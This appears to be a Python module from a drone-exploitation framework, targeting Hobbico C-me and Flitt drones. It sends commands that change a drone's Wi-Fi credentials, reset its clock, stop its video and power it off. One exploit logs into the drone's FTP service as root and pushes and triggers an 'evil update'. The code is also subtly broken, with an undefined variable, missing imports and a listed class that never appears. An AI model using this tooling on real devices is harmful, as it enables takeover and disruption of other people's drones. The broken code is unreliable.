# -*- coding: UTF-8 -*-
import time
import yaml
from datetime import datetime

from . import DroneModule
from ..generic import ftp
from ..wifi import drone_filter


__all__ = ["CmeModule", "CmeUpdateModule", "FlittModule", "FlittCommandModule", "FlittTelnetModule"]


class HobbicoModule(DroneModule):
    """ Module proxy class for defining multiple common utility methods for Hobbico drones.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    fly_params = {
        'format': '{"CMD" : %d, "PARAM" : %s}',
        'result': lambda r: r.get('RESULT') == 0,
    }
    
    def _change_ap_creds(self, ssid, pswd, new_ssid=True):
        i = ["password", "SSID"][new_ssid]
        self.logger.info("Changing %s..." % i)
        r = self.send_command(68, {"phrase": pswd, "ssid": ssid})
        self._feedback(r, "AP %s not changed" % i)
        if not new_ssid:
            self.console.state['TARGETS'][ssid]['password'] = pswd
        self.console.state['PASSWORDS'][ssid] = pswd
        return r
    
    def _change_datetime(self, new_dt, dt_format):
        dt = datetime.strptime(new_dt, dt_format)
        self.logger.info("Changing datetime...")
        r = self.send_command(29, {"YEAR": dt.year, "MONTH": dt.month, "DAY": dt.day, "HOUR": dt.hour,
                                   "MINUTE": dt.minute, "SECOND": dt.second})
        self._feedback(r, "Datetime not changed")
    
    def _get_sysinfo(self):
        self.logger.info("Requesting system information...")
        self._feedback(self.send_command(0, -1), "System info not retrieved")
        r = (self._last_cmd_resp or {}).get('PARAM')
        if r:
            return yaml.dump(r)
    
    def _power_off(self):
        self.logger.info("Shutting down the target...")
        self._feedback(self.send_command(32, 0), "Target not powered off")

    def _stop_video(self):
        self.logger.info("Stopping video...")
        self._feedback(self.send_command(47, 0), "Video not stopped")


class CmeModule(HobbicoModule):
    """ Module proxy class holding the default parameter of a C-me. """
    config = Config({
        Option(
            'IP',
            "IP address of drone's AP",
            True,
        ): "192.168.100.1",
        Option(
            'FLYCTL_PORT',
            "Fly controller port",
            True,
        ): 4646,
        Option(
            'TARGET',
            "Target's SSID",
            True,
            choices=lambda o: [e for e in o.state['TARGETS'].keys() if drone_filter(e, o.module.drone) and \
                               e in o.console.root.connected_targets],
        ): None,
    })
    drone = "Hobbico C-me"
    path = "command/hobbico/cme"
    

class CmeUpdateModule(CmeModule):
    config = Config({
        Option(
            'FTP_PORT',
            "FTP service port",
            True,
        ): 2121,
    })
    path = "exploit/hobbico/cme"
    
    @ftp("SYST", "PWD", "TYPE I", "CWD /", "PASV", username="root", password="*")
    def send_update(self, filename=None):
        self.logger.info("Pushing an evil update...")
        with open(self.config.get("UPDATE_FILE"), 'rb') as f:
            self._ftp.storbinary("STOR 0.7.15.zip", f)
        self.logger.info("Triggering update...")
        success = s.send_command(71, '"0.7.15"')
        if success:
            delay = 10
            self.logger.info("Waiting {} seconds...".format(delay))
            time.sleep(delay)
            self.logger.success("Target updated")
            self.logger.info("Please restart the drone")
        return success


class FlittModule(HobbicoModule):
    """ Module proxy class holding the default IP of a Flitt. """
    config = Config({
        Option(
            'IP',
            "IP address of drone's AP",
            True,
        ): "192.168.234.1",
        Option(
            'TARGET',
            "Target's SSID",
            True,
            choices=lambda o: [e for e in o.state['TARGETS'].keys() if drone_filter(e, o.module.drone) and \
                               e in o.console.root.connected_targets],
        ): None,
    })
    drone = "Hobbico Flitt"
    path = "exploit/hobbico/flitt"


class FlittCommandModule(FlittModule):
    """ Module proxy class holding the default FlyControl port of a Flitt. """
    config = Config({
        Option(
            'FLYCTL_PORT',
            "Fly controller port",
            True,
        ): 10080,
    })
    path = "command/hobbico/flitt"

